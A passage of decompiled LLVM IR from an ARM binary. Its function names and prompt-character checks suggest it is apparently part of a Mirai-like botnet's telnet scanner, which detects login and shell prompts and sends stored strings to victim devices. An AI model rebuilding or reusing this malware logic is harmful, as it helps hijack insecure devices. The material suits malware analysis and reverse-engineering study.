  %v1_fb9c = add i32 %v2_fb94, 13
  %v2_fb9c = inttoptr i32 %v1_fb9c to i8*
  %v3_fb9c = load i8, i8* %v2_fb9c, align 1
  %v4_fb9c = zext i8 %v3_fb9c to i32
  store i32 %v4_fb9c, i32* %r2.global-to-local, align 4
  %v1_fba0 = add i32 %v2_fb94, 4
  %v2_fba0 = inttoptr i32 %v1_fba0 to i32*
  %v3_fba0 = load i32, i32* %v2_fba0, align 4
  store i32 %v3_fba0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fba8 = call i32 @__libc_send(i32 %v3_fb98, i32 %v3_fba0, i32 %v4_fb9c, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fbb0 = load i32, i32* @r6, align 4
  %v1_fbb0 = add i32 %v0_fbb0, 4
  %v2_fbb0 = inttoptr i32 %v1_fbb0 to i32*
  %v3_fbb0 = load i32, i32* %v2_fbb0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fbbc = call i32 @__libc_send(i32 %v3_fbb0, i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32 2, i32 16384)
  store i32 5, i32* @r3, align 4
  %v1_fbc4 = load i32, i32* @r6, align 4
  %v2_fbc4 = add i32 %v1_fbc4, 12
  %v3_fbc4 = inttoptr i32 %v2_fbc4 to i32*
  store i32 5, i32* %v3_fbc4, align 4
  br label %dec_label_pc_f638

dec_label_pc_fbcc:                                ; preds = %dec_label_pc_f470
  %v1_fbcc = add i32 %v0_f470, 24
  %v2_fbcc = inttoptr i32 %v1_fbcc to i32*
  %v3_fbcc = load i32, i32* %v2_fbcc, align 4
  store i32 %v3_fbcc, i32* %r2.global-to-local, align 4
  %v1_fbd0 = add i32 %v3_fbcc, -1
  store i32 %v1_fbd0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbd4 = icmp eq i32 %v1_fbd0, 0
  store i1 %v2_fbd4, i1* %cpsr_z.global-to-local, align 1
  %tmp451 = icmp slt i32 %v1_fbd0, 1
  br i1 %tmp451, label %dec_label_pc_f3f0.backedge.thread, label %dec_label_pc_fbdc

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fbcc
  %v2_fbdc = add i32 %v1_fbd0, %v0_f470
  store i32 %v2_fbdc, i32* %r3.global-to-local, align 4
  %v1_fbe0 = add i32 %v2_fbdc, 28
  %v2_fbe0 = inttoptr i32 %v1_fbe0 to i8*
  %v3_fbe0 = load i8, i8* %v2_fbe0, align 1
  %v4_fbe0 = zext i8 %v3_fbe0 to i32
  store i32 %v4_fbe0, i32* %r3.global-to-local, align 4
  %v2_fbe4 = icmp ugt i8 %v3_fbe0, 61
  store i1 %v2_fbe4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbe4 = icmp eq i8 %v3_fbe0, 62
  store i1 %v7_fbe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbe4, label %dec_label_pc_fc48, label %bb452

bb452:                                            ; preds = %dec_label_pc_fbdc
  %v3_fbe8 = icmp ugt i8 %v3_fbe0, 57
  store i1 %v3_fbe8, i1* %cpsr_c.global-to-local, align 1
  %v8_fbe8 = icmp eq i8 %v3_fbe0, 58
  store i1 %v8_fbe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fbe8, label %dec_label_pc_fc48, label %dec_label_pc_fbf0

dec_label_pc_fbf0:                                ; preds = %bb452
  %v2_fbf0 = icmp ugt i8 %v3_fbe0, 35
  store i1 %v2_fbf0, i1* %cpsr_c.global-to-local, align 1
  %v7_fbf0 = icmp eq i8 %v3_fbe0, 36
  store i1 %v7_fbf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbf0, label %dec_label_pc_fc48, label %dec_label_pc_fbf8

dec_label_pc_fbf8:                                ; preds = %dec_label_pc_fbf0
  %v2_fbf8 = icmp ugt i8 %v3_fbe0, 34
  store i1 %v2_fbf8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbf8 = icmp eq i8 %v3_fbe0, 35
  store i1 %v7_fbf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbf8, label %dec_label_pc_fc48, label %dec_label_pc_fc00

dec_label_pc_fc00:                                ; preds = %dec_label_pc_fbf8
  %v2_fc00 = icmp ugt i8 %v3_fbe0, 36
  store i1 %v2_fc00, i1* %cpsr_c.global-to-local, align 1
  %v7_fc00 = icmp eq i8 %v3_fbe0, 37
  store i1 %v7_fc00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc00, label %dec_label_pc_fc48, label %dec_label_pc_fc30.preheader

dec_label_pc_fc30.preheader:                      ; preds = %dec_label_pc_fc00
  %v3_fc04 = add i32 %v0_f470, 28
  %v2_fc08 = add i32 %v3_fc04, %v3_fbcc
  store i32 %v2_fc08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc30

dec_label_pc_fc14:                                ; preds = %bb453
  %v2_fc14 = icmp ugt i8 %v3_fc38, 35
  store i1 %v2_fc14, i1* %cpsr_c.global-to-local, align 1
  %v7_fc14 = icmp eq i8 %v3_fc38, 36
  store i1 %v7_fc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc14, label %dec_label_pc_fc48, label %dec_label_pc_fc1c

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fc14
  %v2_fc1c = icmp ugt i8 %v3_fc38, 34
  store i1 %v2_fc1c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc1c = icmp eq i8 %v3_fc38, 35
  store i1 %v7_fc1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc1c, label %dec_label_pc_fc48, label %dec_label_pc_fc24

dec_label_pc_fc24:                                ; preds = %dec_label_pc_fc1c
  %v2_fc24 = icmp ugt i8 %v3_fc38, 36
  store i1 %v2_fc24, i1* %cpsr_c.global-to-local, align 1
  %v7_fc24 = icmp eq i8 %v3_fc38, 37
  store i1 %v7_fc24, i1* %cpsr_z.global-to-local, align 1
  %v1_fc28 = add i32 %v0_fc28, -1
  store i32 %v1_fc28, i32* %r3.global-to-local, align 4
  br i1 %v7_fc24, label %dec_label_pc_fc48, label %dec_label_pc_fc30

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fc30.preheader, %dec_label_pc_fc24
  %v0_fc28 = phi i32 [ %v2_fc08, %dec_label_pc_fc30.preheader ], [ %v1_fc28, %dec_label_pc_fc24 ]
  %v0_fc30 = phi i32 [ %v1_fbd0, %dec_label_pc_fc30.preheader ], [ %v1_fc30, %dec_label_pc_fc24 ]
  %v1_fc30 = add i32 %v0_fc30, -1
  store i32 %v1_fc30, i32* %r1.global-to-local, align 4
  %v2_fc30 = icmp ne i32 %v0_fc30, 0
  store i1 %v2_fc30, i1* %cpsr_c.global-to-local, align 1
  %v7_fc30 = icmp eq i32 %v0_fc30, 1
  store i1 %v7_fc30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc30, label %dec_label_pc_f3f0.backedge.thread564, label %dec_label_pc_fc38

dec_label_pc_fc38:                                ; preds = %dec_label_pc_fc30
  %v1_fc38 = add i32 %v0_fc28, -2
  %v2_fc38 = inttoptr i32 %v1_fc38 to i8*
  %v3_fc38 = load i8, i8* %v2_fc38, align 1
  %v4_fc38 = zext i8 %v3_fc38 to i32
  store i32 %v4_fc38, i32* %r2.global-to-local, align 4
  %v2_fc3c = icmp ugt i8 %v3_fc38, 61
  store i1 %v2_fc3c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc3c = icmp eq i8 %v3_fc38, 62
  store i1 %v7_fc3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc3c, label %dec_label_pc_fc48, label %bb453

bb453:                                            ; preds = %dec_label_pc_fc38
  %v3_fc40 = icmp ugt i8 %v3_fc38, 57
  store i1 %v3_fc40, i1* %cpsr_c.global-to-local, align 1
  %v8_fc40 = icmp eq i8 %v3_fc38, 58
  store i1 %v8_fc40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc40, label %dec_label_pc_fc48, label %dec_label_pc_fc14

dec_label_pc_fc48:                                ; preds = %dec_label_pc_fc38, %bb453, %dec_label_pc_fc24, %dec_label_pc_fc1c, %dec_label_pc_fc14, %dec_label_pc_fc00, %dec_label_pc_fbdc, %dec_label_pc_fbf8, %dec_label_pc_fbf0, %bb452
  %v0_fc4c = phi i32 [ %v1_fbd0, %dec_label_pc_fc00 ], [ %v1_fbd0, %dec_label_pc_fbdc ], [ %v1_fbd0, %dec_label_pc_fbf8 ], [ %v1_fbd0, %dec_label_pc_fbf0 ], [ %v1_fbd0, %bb452 ], [ %v1_fc30, %dec_label_pc_fc14 ], [ %v1_fc30, %dec_label_pc_fc1c ], [ %v1_fc30, %dec_label_pc_fc24 ], [ %v1_fc30, %bb453 ], [ %v1_fc30, %dec_label_pc_fc38 ]
  %v1_fc4c = add i32 %v0_fc4c, 1
  store i32 %v1_fc4c, i32* @r7, align 4
  %v1_fc50 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_fc60 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  %v3_fc64 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fc64, i32* %r2.global-to-local, align 4
  store i32 %v3_fc60, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc70 = load i32, i32* @r6, align 4
  %v1_fc70 = add i32 %v0_fc70, 4
  %v2_fc70 = inttoptr i32 %v1_fc70 to i32*
  %v3_fc70 = load i32, i32* %v2_fc70, align 4
  %v4_fc74 = call i32 @__libc_send(i32 %v3_fc70, i32 %v3_fc60, i32 %v3_fc64, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fc84 = load i32, i32* @r6, align 4
  %v1_fc84 = add i32 %v0_fc84, 4
  %v2_fc84 = inttoptr i32 %v1_fc84 to i32*
  %v3_fc84 = load i32, i32* %v2_fc84, align 4
  %v4_fc88 = call i32 @__libc_send(i32 %v3_fc84, i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32 2, i32 16384)
  %v1_fc90 = call i32 @table_lock_val(i32 6)
  store i32 8, i32* @r3, align 4
  %v1_fc98 = load i32, i32* @r6, align 4
  %v2_fc98 = add i32 %v1_fc98, 12
  %v3_fc98 = inttoptr i32 %v2_fc98 to i32*
  store i32 8, i32* %v3_fc98, align 4
  br label %dec_label_pc_f640

dec_label_pc_fca0:                                ; preds = %dec_label_pc_f470
  %v1_fca0 = add i32 %v0_f470, 24
  %v2_fca0 = inttoptr i32 %v1_fca0 to i32*
  %v3_fca0 = load i32, i32* %v2_fca0, align 4
  store i32 %v3_fca0, i32* %r2.global-to-local, align 4
  %v1_fca4 = add i32 %v3_fca0, -1
  store i32 %v1_fca4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fca8 = icmp eq i32 %v1_fca4, 0
  store i1 %v2_fca8, i1* %cpsr_z.global-to-local, align 1
  %tmp454 = icmp slt i32 %v1_fca4, 1
  br i1 %tmp454, label %dec_label_pc_fd1c, label %dec_label_pc_fcb0

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fca0
  %v2_fcb0 = add i32 %v1_fca4, %v0_f470
  store i32 %v2_fcb0, i32* %r3.global-to-local, align 4
  %v1_fcb4 = add i32 %v2_fcb0, 28
  %v2_fcb4 = inttoptr i32 %v1_fcb4 to i8*
  %v3_fcb4 = load i8, i8* %v2_fcb4, align 1
  %v4_fcb4 = zext i8 %v3_fcb4 to i32
  store i32 %v4_fcb4, i32* %r3.global-to-local, align 4
  %v2_fcb8 = icmp ugt i8 %v3_fcb4, 61
  store i1 %v2_fcb8, i1* %cpsr_c.global-to-local, align 1
  %v7_fcb8 = icmp eq i8 %v3_fcb4, 62
  store i1 %v7_fcb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcb8, label %dec_label_pc_fe34, label %bb455

bb455:                                            ; preds = %dec_label_pc_fcb0
  %v3_fcbc = icmp ugt i8 %v3_fcb4, 57
  store i1 %v3_fcbc, i1* %cpsr_c.global-to-local, align 1
  %v8_fcbc = icmp eq i8 %v3_fcb4, 58
  store i1 %v8_fcbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fcbc, label %dec_label_pc_fe34, label %dec_label_pc_fcc4

dec_label_pc_fcc4:                                ; preds = %bb455
  %v2_fcc4 = icmp ugt i8 %v3_fcb4, 35
  store i1 %v2_fcc4, i1* %cpsr_c.global-to-local, align 1
  %v7_fcc4 = icmp eq i8 %v3_fcb4, 36
  store i1 %v7_fcc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcc4, label %dec_label_pc_fe34, label %dec_label_pc_fccc

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fcc4
  %v2_fccc = icmp ugt i8 %v3_fcb4, 34
  store i1 %v2_fccc, i1* %cpsr_c.global-to-local, align 1
  %v7_fccc = icmp eq i8 %v3_fcb4, 35
  store i1 %v7_fccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fccc, label %dec_label_pc_fe34, label %dec_label_pc_fcd4

dec_label_pc_fcd4:                                ; preds = %dec_label_pc_fccc
  %v2_fcd4 = icmp ugt i8 %v3_fcb4, 36
  store i1 %v2_fcd4, i1* %cpsr_c.global-to-local, align 1
  %v7_fcd4 = icmp eq i8 %v3_fcb4, 37
  store i1 %v7_fcd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcd4, label %dec_label_pc_fe34, label %dec_label_pc_fd14.preheader

dec_label_pc_fd14.preheader:                      ; preds = %dec_label_pc_fcd4
  %v3_fcd8 = add i32 %v0_f470, 28
  %v2_fcdc = add i32 %v3_fcd8, %v3_fca0
  store i32 %v2_fcdc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fd14

dec_label_pc_fce8:                                ; preds = %dec_label_pc_fd14
  %v1_fce8 = add i32 %v0_fd0c, -2
  %v2_fce8 = inttoptr i32 %v1_fce8 to i8*
  %v3_fce8 = load i8, i8* %v2_fce8, align 1
  %v4_fce8 = zext i8 %v3_fce8 to i32
  store i32 %v4_fce8, i32* %r2.global-to-local, align 4
  %v2_fcec = icmp ugt i8 %v3_fce8, 61
  store i1 %v2_fcec, i1* %cpsr_c.global-to-local, align 1
  %v7_fcec = icmp eq i8 %v3_fce8, 62
  store i1 %v7_fcec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcec, label %dec_label_pc_fe34, label %bb456

bb456:                                            ; preds = %dec_label_pc_fce8
  %v3_fcf0 = icmp ugt i8 %v3_fce8, 57
  store i1 %v3_fcf0, i1* %cpsr_c.global-to-local, align 1
  %v8_fcf0 = icmp eq i8 %v3_fce8, 58
  store i1 %v8_fcf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fcf0, label %dec_label_pc_fe34, label %dec_label_pc_fcf8

dec_label_pc_fcf8:                                ; preds = %bb456
  %v2_fcf8 = icmp ugt i8 %v3_fce8, 35
  store i1 %v2_fcf8, i1* %cpsr_c.global-to-local, align 1
  %v7_fcf8 = icmp eq i8 %v3_fce8, 36
  store i1 %v7_fcf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcf8, label %dec_label_pc_fe34, label %dec_label_pc_fd00

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fcf8
  %v2_fd00 = icmp ugt i8 %v3_fce8, 34
  store i1 %v2_fd00, i1* %cpsr_c.global-to-local, align 1
  %v7_fd00 = icmp eq i8 %v3_fce8, 35
  store i1 %v7_fd00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd00, label %dec_label_pc_fe34, label %dec_label_pc_fd08

dec_label_pc_fd08:                                ; preds = %dec_label_pc_fd00
  %v2_fd08 = icmp ugt i8 %v3_fce8, 36
  store i1 %v2_fd08, i1* %cpsr_c.global-to-local, align 1
  %v7_fd08 = icmp eq i8 %v3_fce8, 37
  store i1 %v7_fd08, i1* %cpsr_z.global-to-local, align 1
  %v1_fd0c = add i32 %v0_fd0c, -1
  store i32 %v1_fd0c, i32* %r3.global-to-local, align 4
  br i1 %v7_fd08, label %dec_label_pc_fe34, label %dec_label_pc_fd14

dec_label_pc_fd14:                                ; preds = %dec_label_pc_fd14.preheader, %dec_label_pc_fd08
  %v0_fd0c = phi i32 [ %v2_fcdc, %dec_label_pc_fd14.preheader ], [ %v1_fd0c, %dec_label_pc_fd08 ]
  %v0_fd14 = phi i32 [ %v1_fca4, %dec_label_pc_fd14.preheader ], [ %v1_fd14, %dec_label_pc_fd08 ]
  %v1_fd14 = add i32 %v0_fd14, -1
  store i32 %v1_fd14, i32* %r1.global-to-local, align 4
  %v2_fd14 = icmp ne i32 %v0_fd14, 0
  store i1 %v2_fd14, i1* %cpsr_c.global-to-local, align 1
  %v7_fd14 = icmp eq i32 %v0_fd14, 1
  store i1 %v7_fd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd14, label %dec_label_pc_fd1c, label %dec_label_pc_fce8

dec_label_pc_fd1c:                                ; preds = %dec_label_pc_fd14, %dec_label_pc_fca0
  %v1_fd20 = call i32 @table_unlock_val(i32 28)
  %v1_fd28 = call i32 @table_unlock_val(i32 29)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_fd38 = call i32 @table_retrieve_val(i32 28, i32* nonnull %stack_var_-60)
  store i32 %v3_fd38, i32* @r4, align 4
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  %v3_fd4c = call i32 @table_retrieve_val(i32 29, i32* nonnull %stack_var_-60)
  %v3_fd50 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fd4c, i32* @r5, align 4
  %v0_fd58 = load i32, i32* @r4, align 4
  store i32 %v0_fd58, i32* %r2.global-to-local, align 4
  %v1_fd5c = add i32 %v3_fd50, -1
  store i32 %v1_fd5c, i32* %r3.global-to-local, align 4
  %v0_fd60 = load i32, i32* @fp, align 4
  %v0_fd64 = load i32, i32* @r6, align 4
  %v1_fd64 = add i32 %v0_fd64, 24
  %v2_fd64 = inttoptr i32 %v1_fd64 to i32*
  %v3_fd64 = load i32, i32* %v2_fd64, align 4
  store i32 %v3_fd64, i32* %r1.global-to-local, align 4
  %v4_fd68 = call i32 @util_memsearch(i32 %v0_fd60, i32 %v3_fd64, i32 %v0_fd58, i32 %v1_fd5c)
  %v2_fd6c = icmp eq i32 %v4_fd68, -1
  store i1 %v2_fd6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd6c = icmp eq i32 %v4_fd68, -1
  store i1 %v7_fd6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd6c, label %dec_label_pc_fd7c, label %dec_label_pc_fda4

dec_label_pc_fd7c:                                ; preds = %dec_label_pc_fd1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_fd7c = load i32, i32* %stack_var_-60, align 4
  %v0_fd80 = load i32, i32* @r5, align 4
  store i32 %v0_fd80, i32* %r2.global-to-local, align 4
  %v1_fd84 = add i32 %v3_fd7c, -1
  store i32 %v1_fd84, i32* %r3.global-to-local, align 4
  %v0_fd88 = load i32, i32* @fp, align 4
  %v0_fd8c = load i32, i32* @r6, align 4
  %v1_fd8c = add i32 %v0_fd8c, 24
  %v2_fd8c = inttoptr i32 %v1_fd8c to i32*
  %v3_fd8c = load i32, i32* %v2_fd8c, align 4
  store i32 %v3_fd8c, i32* %r1.global-to-local, align 4
  %v4_fd90 = call i32 @util_memsearch(i32 %v0_fd88, i32 %v3_fd8c, i32 %v0_fd80, i32 %v1_fd84)
  %v1_fd94 = add i32 %v4_fd90, 1
  store i32 %v1_fd94, i32* @r7, align 4
  %v2_fd94 = icmp eq i32 %v4_fd90, -1
  store i1 %v2_fd94, i1* %cpsr_c.global-to-local, align 1
  %v7_fd94 = icmp eq i32 %v1_fd94, 0
  store i1 %v7_fd94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd94, label %dec_label_pc_10144, label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fd7c, %dec_label_pc_fd1c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v1_fda8 = call i32 @table_lock_val(i32 28)
  %v1_fdb0 = call i32 @table_lock_val(i32 29)
  %v0_fdb4 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fdb4 = icmp eq i32 %v0_fdb4, 0
  store i1 %v2_fdb4, i1* %cpsr_z.global-to-local, align 1
  %tmp457 = icmp slt i32 %v0_fdb4, 1
  br i1 %tmp457, label %dec_label_pc_f638, label %dec_label_pc_fe48

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_f780
  store i32 %v2_fdc4, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_19654.195 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_fdc4, i32* @r0, align 4
  store i32 %v2_fdd8, i32* @sl, align 4
  %v0_fddc = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_fdd8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1964b.197 to i32), i32* @r1, align 4
  %v0_fdec = call i32 @memcpy()
  %v0_fdf0 = load i32, i32* @r6, align 4
  %v1_fdf0 = add i32 %v0_fdf0, 24
  %v2_fdf0 = inttoptr i32 %v1_fdf0 to i32*
  %v3_fdf0 = load i32, i32* %v2_fdf0, align 4
  %v0_fdf4 = load i32, i32* @r4, align 4
  %v1_fdf4 = add i32 %v0_fdf4, 2
  store i32 %v1_fdf4, i32* %r2.global-to-local, align 4
  %v0_fdf8 = load i32, i32* @fp, align 4
  %v2_fdf8 = add i32 %v0_fdf8, %v3_fdf0
  store i32 %v2_fdf8, i32* @r3, align 4
  %v3_fdfc = icmp uge i32 %v2_fdf8, %v1_fdf4
  store i1 %v3_fdfc, i1* %cpsr_c.global-to-local, align 1
  %v9_fdfc = icmp eq i32 %v2_fdf8, %v1_fdf4
  store i1 %v9_fdfc, i1* %cpsr_z.global-to-local, align 1
  %v2_fe00 = xor i1 %v3_fdfc, true
  %v3_fe00 = or i1 %v9_fdfc, %v2_fe00
  br i1 %v3_fe00, label %dec_label_pc_fdc0.dec_label_pc_f7fc.loopexit_crit_edge, label %dec_label_pc_fe04

dec_label_pc_fdc0.dec_label_pc_f7fc.loopexit_crit_edge: ; preds = %dec_label_pc_fdc0
  %v0_f7fc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f7fc

dec_label_pc_fe04:                                ; preds = %dec_label_pc_fdc0
  %v2_fe04 = inttoptr i32 %v1_fdf4 to i8*
  %v3_fe04 = load i8, i8* %v2_fe04, align 1
  %v4_fe04 = zext i8 %v3_fe04 to i32
  store i32 %v4_fe04, i32* %r3.global-to-local, align 4
  %v2_fe08 = icmp ugt i8 %v3_fe04, 30
  store i1 %v2_fe08, i1* %cpsr_c.global-to-local, align 1
  %v7_fe08 = icmp eq i8 %v3_fe04, 31
  store i1 %v7_fe08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe08, label %dec_label_pc_fed4, label %dec_label_pc_fe10

dec_label_pc_fe10:                                ; preds = %dec_label_pc_fe04
  %v1_fe10 = inttoptr i32 %v0_fdf4 to i8*
  %v2_fe10 = load i8, i8* %v1_fe10, align 1
  %v3_fe10 = zext i8 %v2_fe10 to i32
  store i32 %v3_fe10, i32* %r3.global-to-local, align 4
  %v2_fe14 = icmp ugt i8 %v2_fe10, -4
  store i1 %v2_fe14, i1* %cpsr_c.global-to-local, align 1
  %v7_fe14 = icmp eq i8 %v2_fe10, -3
  store i1 %v7_fe14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe14, label %.thread147, label %dec_label_pc_fe24

.thread147:                                       ; preds = %dec_label_pc_fe10
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_fe10, align 1
  %v0_fe20.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fe20.pr.pr, label %dec_label_pc_f794, label %.thread147.dec_label_pc_fe24thread-pre-split_crit_edge

.thread147.dec_label_pc_fe24thread-pre-split_crit_edge: ; preds = %.thread147
  %v0_fe24.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe24

dec_label_pc_fe24:                                ; preds = %dec_label_pc_fe10, %.thread147.dec_label_pc_fe24thread-pre-split_crit_edge
  %v0_fe24.pr = phi i32 [ %v0_fe24.pr.pre, %.thread147.dec_label_pc_fe24thread-pre-split_crit_edge ], [ %v3_fe10, %dec_label_pc_fe10 ]
  %v2_fe24 = icmp ugt i32 %v0_fe24.pr, 250
  store i1 %v2_fe24, i1* %cpsr_c.global-to-local, align 1
  %v7_fe24 = icmp eq i32 %v0_fe24.pr, 251
  store i1 %v7_fe24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe24, label %bb458, label %dec_label_pc_f794

bb458:                                            ; preds = %dec_label_pc_fe24
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fe2c = load i32, i32* @r4, align 4
  %v4_fe2c = inttoptr i32 %v3_fe2c to i8*
  store i8 -3, i8* %v4_fe2c, align 1
  br label %dec_label_pc_f794

dec_label_pc_fe34:                                ; preds = %dec_label_pc_fce8, %dec_label_pc_fd08, %dec_label_pc_fd00, %dec_label_pc_fcf8, %bb456, %dec_label_pc_fcd4, %dec_label_pc_fcb0, %dec_label_pc_fccc, %dec_label_pc_fcc4, %bb455
  %v0_fe38 = phi i32 [ %v1_fca4, %dec_label_pc_fcd4 ], [ %v1_fca4, %dec_label_pc_fcb0 ], [ %v1_fca4, %dec_label_pc_fccc ], [ %v1_fca4, %dec_label_pc_fcc4 ], [ %v1_fca4, %bb455 ], [ %v1_fd14, %bb456 ], [ %v1_fd14, %dec_label_pc_fcf8 ], [ %v1_fd14, %dec_label_pc_fd00 ], [ %v1_fd14, %dec_label_pc_fd08 ], [ %v1_fd14, %dec_label_pc_fce8 ]
  %v1_fe38 = add i32 %v0_fe38, 1
  store i32 %v1_fe38, i32* @r7, align 4
  %v1_fe3c = call i32 @table_lock_val(i32 28)
  %v1_fe44 = call i32 @table_lock_val(i32 29)
  br label %dec_label_pc_fe48

dec_label_pc_fe48:                                ; preds = %dec_label_pc_fda4, %dec_label_pc_fe34
  %v0_fe48 = load i32, i32* @r6, align 4
  %v1_fe48 = inttoptr i32 %v0_fe48 to i32*
  %v2_fe48 = load i32, i32* %v1_fe48, align 4
  store i32 %v2_fe48, i32* %r3.global-to-local, align 4
  %v1_fe4c = add i32 %v0_fe48, 4
  %v2_fe4c = inttoptr i32 %v1_fe4c to i32*
  %v3_fe4c = load i32, i32* %v2_fe4c, align 4
  %v1_fe50 = add i32 %v2_fe48, 12
  %v2_fe50 = inttoptr i32 %v1_fe50 to i8*
  %v3_fe50 = load i8, i8* %v2_fe50, align 1
  %v4_fe50 = zext i8 %v3_fe50 to i32
  store i32 %v4_fe50, i32* %r2.global-to-local, align 4
  %v1_fe54 = inttoptr i32 %v2_fe48 to i32*
  %v2_fe54 = load i32, i32* %v1_fe54, align 4
  store i32 %v2_fe54, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fe5c = call i32 @__libc_send(i32 %v3_fe4c, i32 %v2_fe54, i32 %v4_fe50, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fe64 = load i32, i32* @r6, align 4
  %v1_fe64 = add i32 %v0_fe64, 4
  %v2_fe64 = inttoptr i32 %v1_fe64 to i32*
  %v3_fe64 = load i32, i32* %v2_fe64, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fe70 = call i32 @__libc_send(i32 %v3_fe64, i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), i32 2, i32 16384)
  store i32 4, i32* @r3, align 4
  %v1_fe78 = load i32, i32* @r6, align 4
  %v2_fe78 = add i32 %v1_fe78, 12
  %v3_fe78 = inttoptr i32 %v2_fe78 to i32*
  store i32 4, i32* %v3_fe78, align 4
  br label %dec_label_pc_f638

dec_label_pc_fe80:                                ; preds = %dec_label_pc_fb20, %dec_label_pc_fb38, %dec_label_pc_fb30, %bb450, %dec_label_pc_fb0c, %dec_label_pc_faf0, %dec_label_pc_fb04, %bb449
  %v0_fe84 = phi i32 [ %v1_fae4, %dec_label_pc_fb0c ], [ %v1_fae4, %dec_label_pc_faf0 ], [ %v1_fae4, %dec_label_pc_fb04 ], [ %v1_fae4, %bb449 ], [ %v1_fb44, %bb450 ], [ %v1_fb44, %dec_label_pc_fb30 ], [ %v1_fb44, %dec_label_pc_fb38 ], [ %v1_fb44, %dec_label_pc_fb20 ]
  %v1_fe84 = add i32 %v0_fe84, 1
  store i32 %v1_fe84, i32* @r7, align 4
  %v1_fe88 = call i32 @table_lock_val(i32 27)
  br label %dec_label_pc_fb94

dec_label_pc_fe90:                                ; preds = %dec_label_pc_f514
  %v0_fe98 = load i32, i32* @r6, align 4
  %v1_fe98 = add i32 %v0_fe98, 4
  %v2_fe98 = inttoptr i32 %v1_fe98 to i32*
  %v3_fe98 = load i32, i32* %v2_fe98, align 4
